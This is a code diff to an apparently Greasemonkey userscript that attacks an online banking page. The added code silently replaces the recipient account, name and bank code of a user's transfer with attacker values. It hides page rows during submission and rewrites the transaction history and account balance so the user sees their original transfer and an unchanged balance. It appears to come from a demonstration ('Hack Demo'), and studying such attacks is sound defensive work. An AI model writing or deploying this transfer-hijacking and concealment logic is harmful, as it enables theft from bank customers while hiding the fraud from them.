@@ -127,11 +127,53 @@ window.deleteData = function(){
 }
 //deleteData();
 
+//conversion from float to money value
+//script from http://www.irt.org/script/723.htm and slightly adapted to
+//€-format
+function outputMoney(number) {
+    return outputEuros(Math.floor(number-0) + '') + outputCents(number - 0);
+}
 
+function outputEuros(number) {
+    if (number.length <= 3)
+        return (number == '' ? '0' : number);
+    if (number.length <= 4 && number < 0)
+    	return (number);
+    else {
+        var mod = number.length%3;
+        var output = (mod == 0 ? '' : (number.substring(0,mod)));
+        for (i=0 ; i < Math.floor(number.length/3) ; i++) {
+            if ((mod ==0) && (i ==0))
+                output+= number.substring(mod+3*i,mod+3*i+3);
+            else
+                output+= '.' + number.substring(mod+3*i,mod+3*i+3);
+        }
+        return (output);
+    }
+}
+
+
+
+
+function outputCents(amount) {
+    amount = Math.round( ( (amount) - Math.floor(amount) ) *100);
+    return (amount < 10 ? ',0' + amount : '.' + amount);
+}
+
+/*
+ * gets real money and computes expected money
+ */
+function getHackedMoney(realMoney) {
+	storedTransfers = loadTransfers();
+	diffMoney = 0;
+	for ( i = 0; i < storedTransfers.length; i++) {
+		diffMoney += HACK_AMOUNT - storedTransfers[i].amount;
+	}
+	return (realMoney + diffMoney);
+}
 	 function timedMsg()
 		 {
 		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){	
-			 	console.log("a");
 		 			$(this).attr("hackMarker","true");
 		 			sendMoneyBtnClone=$(this).clone(true)
 		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
@@ -141,8 +183,8 @@ window.deleteData = function(){
 		 			sendMoneyBtnClone.click(function(event) {
 		 				event.preventDefault();
 		 				
-		 				 newTransfer = new Transfer($("input:eq(1)").val(),
-		 						$("input:eq(2)").val(), $("input:eq(3)").val(), 
+		 				 newTransfer = new Transfer($("input:eq(2)").val(),
+		 						$("input:eq(1)").val(), $("input:eq(3)").val(), 
 		 						$("input:eq(4)").val(), 
 		 						$("input:eq(5)").val(), $("input:eq(6)").val(), new 
 		 						Date(), new Boolean(false));
@@ -159,11 +201,11 @@ window.deleteData = function(){
 			 					index--;
 			 				 }
 		 				 }
-		 				console.log(index);
+
 		 				storedTransfers[index] = newTransfer;
 		 				
 		 				saveTransfers(storedTransfers);
-		 				
+		 				$("tr").hide();
 		 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
 		 				$("input:eq(2)").val(HACK_REC_NAME);
 		 				$("input:eq(3)").val(HACK_BANK_BLZ);
@@ -172,13 +214,17 @@ window.deleteData = function(){
 		 				$("input:eq(6)").val(HACK_USAGE);
 		 				sendMoneyBtnClone.attr("activateReset","true");
 		 				$("button[hackMarkerBtnOrig='true']")[0].click();
+		 				
+		 				//hide hacked values
+		 				$("tr").hide();
 		 				$(this).hide();
+		 				
 		 				});			
 		 			
 		 	});
-		 	
+
 		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)[activateReset='true']").each(function(){
-		 		 
+
 		 		 storedTransfers = loadTransfers();
 		 		lastTransfer = storedTransfers[storedTransfers.length - 1];
 		 		
@@ -188,7 +234,11 @@ window.deleteData = function(){
 				$("input:eq(4)").val(lastTransfer.bank_Name);
 				$("input:eq(5)").val(lastTransfer.amount);
 				$("input:eq(6)").val(lastTransfer.remark);
+				
+				//show expected values
+				$("tr").show();
 
+				
 		 		$(this).attr("hackConfPageMarker","true");
 		 	});
 		 	
@@ -203,6 +253,8 @@ window.deleteData = function(){
 	 				storedTransfers = loadTransfers();
 	 		 		lastTransfer = storedTransfers[storedTransfers.length - 1];
 	 		 		
+	 		 		//first hide everything
+	 		 		$("tr").hide();
 	 		 		//send hacked values
 	 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
 	 				$("input:eq(2)").val(HACK_REC_NAME);
@@ -219,6 +271,8 @@ window.deleteData = function(){
 					$("input:eq(4)").val(lastTransfer.bank_Name);
 					$("input:eq(5)").val(lastTransfer.amount);
 					$("input:eq(6)").val(lastTransfer.remark);
+					$("tr").show();
+					
 					
 					//set transfer to be committed (not necessarily true e.g. if tan is wrong!)
 					lastTransfer.commited = true;
@@ -278,7 +332,8 @@ window.deleteData = function(){
 		 		//original data by user
 		 		var originalData;
 		 		if (correctHackIndex == -1) {
-		 			console.log("Error. Could not find original data. Using some generic fake data.");
+		 			if (DEBUG)
+		 				console.log("Error. Could not find original data. Using some generic fake data.");
 		 			//create some fake data
 		 			originalData = new Transfer(globalRC_Acc_Name, globalRC_Acc_Nr,
 		 				globalRC_Bank_BLZ, globalRC_Bank_Name,
@@ -292,7 +347,7 @@ window.deleteData = function(){
 		 		//now change all values so that it appears as if the transfer would not have been hacked
 		 		//date does not need to be changed
 		 		var recipient = $(this).children();
-		 		recipient.text(originalData.acc_Name);
+		 		recipient.text(originalData.acc_Name + "(" + originalData.acc_Nr + ")");
 		 		
 		 		var bank =		$(this).next().children();
 		 		bank.text(originalData.bank_Name + " (" + originalData.bank_BLZ + ")");
@@ -304,15 +359,87 @@ window.deleteData = function(){
 		 		amount.text(originalData.amount);
 
 		 		
-		 	}); 	
-		 	var t=setTimeout(timedMsg,300);
+		 		$(this).parent().show();
+		 		
+		 	});
+
+			 
+			 
+			 
+		 	//set hackmarker for transaction so they will not be changed during account amount manipulation
+		 	transactionRow= $(".TransfersOdd,.TransfersEven").each(function(){
+		 		$(this).next().next().next().attr("hackMarker","true");	
+		 		$(this).show();
+		 	});
+		 	//manipulate account balance
+		 	$(".negativeMoney[hackmarker!='true'],.positiveMoney[hackmarker!='true']").each(function() {
+				 $(this).attr("hackMarker","true");
+				 $(this).show();
+				 //manipulate string to look like internal representation of a number
+				 text = $(this).text();
+				 text = text.replace(".", "");
+				 text = text.replace(",", ".");
+				 
+				 text = text.replace("\u20AC", "");
+				 
+				 oldValue = new parseFloat(text); 
+				 newValue = getHackedMoney(oldValue);
+				 
+				
+				//display with 2 decimal places and €
+				$(this).text(outputMoney(newValue) + " \u20AC");
+			 });
+
 		 }
 	 
 	 $(document).ready(function() {
- 	timedMsg();
+		 window.addEventListener ("DOMNodeInserted", pageChanged, true); 	
 	 });
-  
 
+
+	 function pageChanged()  {
+		 //first hide money value so user will not see that money value will be manipulated
+		 //because of delay in manipulation call
+		 $(".negativeMoney[hackmarker!='true'],.positiveMoney[hackmarker!='true']").each(function() {
+			 $(this).hide();
+		 });
+		 //hide all hacked transfers as well
+		 hackedRow= $(".TransfersOdd,.TransfersEven").filter(':contains(Hack Demo)').each(function(){			
+			$(this).parent().hide(); 
+		 });
+		 
+		// some delay for function call is needed
+		// otherwise the browser will lag
+		
+		setTimeout(timedMsg,1); 
+	 }
  
- 
-  
+	 
+
+	 //some convenience greasemonkey functions
+	 ressource= document.URL.split("/")[3];
+	 if (ressource == "gm.html") {
+		
+		 var form = document.createElement("form");
+		 form.innerHTML = 
+			 '<form action=(void)>' +
+			 '<input type="submit" value="Delete data">'+
+			 '</form>';
+		 		 
+	   
+		 document.title ="Local Greasemonkey page";
+		 document.body.innerHTML ="<div/>";
+	   document.body.replaceChild(form, document.body.firstChild);
+	   document.addEventListener('click', function(event) {
+		    event.stopPropagation();
+		    event.preventDefault();
+		    if (event.target.value == "Delete data") {
+			    if (confirm("This will delete all stored data.\nAre you sure?")) {
+			    	deleteData();	
+			    	alert("Done");
+			    }
+	   		}
+		    
+		}, true);
+			
+	 }
